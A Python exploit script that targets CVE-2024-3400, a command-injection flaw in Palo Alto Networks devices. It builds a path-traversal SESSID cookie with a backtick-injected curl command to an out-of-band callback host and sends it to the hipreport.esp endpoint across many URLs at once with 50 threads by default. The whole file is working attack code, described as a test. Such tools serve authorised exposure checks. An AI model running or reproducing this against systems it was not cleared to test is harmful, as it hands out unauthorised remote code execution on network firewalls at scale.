import argparse
import requests
import urllib.parse
from rich.console import Console
from typing import List, Optional
from requests.models import Response
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed


class PaloAltoSkids:
    """
    This class is designed to test for CVE-2024-3400, a Remote Code Execution (RCE) vulnerability
    in certain Palo Alto Networks devices.
    """

    def __init__(
        self,
        urls: List[str],
        oob: str,
        num_threads: int,
        verbose: bool,
    ):
        self.urls = urls
        self.oob = oob
        self.num_threads = num_threads
        self.verbose = verbose
        self.console = Console()
        requests.packages.urllib3.disable_warnings()

    def custom_print(self, message: str, header: str) -> None:
        """Prints messages to the console with custom formatting based on message type."""
        header_colors = {
            "+": "green",  # Success
            "-": "red",  # Error
            "!": "yellow",  # Warning
            "*": "blue",  # Info
        }
        self.console.print(
            f"[bold {header_colors.get(header, 'white')}][{header}][/bold {header_colors.get(header, 'white')}] {message}"
        )

    def send_exploit_request(self, base_url: str) -> None:
        """Send a malicious GET request to trigger the RCE vulnerability."""
        command = f"curl {self.oob}"
        malicious_cookie = f"/../../../../opt/panlogs/tmp/device_telemetry/minute/test`{command}`".replace(
            " ", "${IFS}"
        )
        cookies = {"SESSID": malicious_cookie}
        try:
            response = requests.post(
                f"{base_url}/ssl-vpn/hipreport.esp",
                cookies=cookies,
                timeout=10,
                verify=False,
            )
            if response.status_code == 200:
                self.custom_print("Request successful", "+")
        except requests.exceptions.RequestException as e:
            pass

    def execute_exploit(self) -> None:
        """Execute the exploit across multiple URLs"""
        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = {
                executor.submit(self.send_exploit_request, url): url
                for url in self.urls
            }
            with alive_bar(len(self.urls), enrich_print=False) as bar:
                for future in as_completed(futures):
                    try:
                        result = future.result()
                    except Exception as e:
                        self.custom_print(f"Error processing URL: {e}", "-")
                    finally:
                        bar()


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Test for CVE-2024-3400, a RCE vulnerability in Palo Alto Networks devices."
    )
    parser.add_argument("-u", "--url", help="Single URL to test")
    parser.add_argument("-f", "--file", help="File containing target URLs to scan")

    parser.add_argument("-o", "--oob", required=True, help="Interactsh URL")

    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=50,
        help="Number of threads to use for scanning",
    )

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either a URL or a file with URLs must be specified.")

    return args


def main() -> None:
    args = parse_arguments()
    urls = [args.url] if args.url else []
    if args.file:
        with open(args.file, "r") as file:
            urls.extend(line.strip() for line in file if line.strip())

    exploit = PaloAltoSkids(urls, args.oob, args.threads, bool(args.url))
    exploit.execute_exploit()


if __name__ == "__main__":
    main()
